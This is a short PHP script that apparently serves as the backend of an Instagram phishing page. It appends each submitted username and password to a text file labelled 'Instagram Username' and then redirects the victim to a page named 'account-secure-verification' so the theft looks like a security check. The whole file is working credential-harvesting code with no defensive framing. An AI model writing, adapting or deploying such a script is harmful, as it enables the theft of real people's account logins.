<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: account-secure-verification');
exit();
?>
